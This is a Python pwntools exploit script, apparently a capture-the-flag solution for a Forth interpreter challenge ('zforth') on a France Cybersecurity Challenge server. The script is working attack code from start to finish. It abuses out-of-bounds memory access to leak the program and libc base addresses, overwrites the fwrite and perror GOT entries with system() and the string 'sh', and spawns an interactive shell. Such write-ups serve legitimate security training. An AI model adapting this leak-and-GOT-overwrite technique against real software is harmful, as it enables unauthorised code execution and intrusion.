#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./zforth_patched')
libc = ELF('./libc.so.6')

host, port = "challenges.france-cybersecurity-challenge.fr", "2107"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path+' ./core.zf', shell=True)

# calculate prog base
sla('used\n', '-304 4 tell')
exe.address = u32(p.recvuntil('\n', drop=True))-0x6070
logleak('prog base', exe.address)

# calculate libc base
sl(str(exe.got['printf']-exe.sym['dict'])+' 4 tell')
libc.address = u32(p.recvuntil('\n', drop=True)) - libc.sym['printf']
logbase()

# put system() in fwrite GOT entry
val = libc.sym['system']
sl(str(val)+' '+str(exe.got['fwrite']-exe.sym['dict'])+' 4 !!')
# put 'sh' string in perror GOT entry
val = u32(b'sh\x00\x00')
sl(str(val)+' '+str(exe.got['perror']-exe.sym['dict'])+' 4 !!')

# call system('sh')
sl(str(exe.got['perror']-exe.sym['dict'])+' 4 tell')

p.interactive()

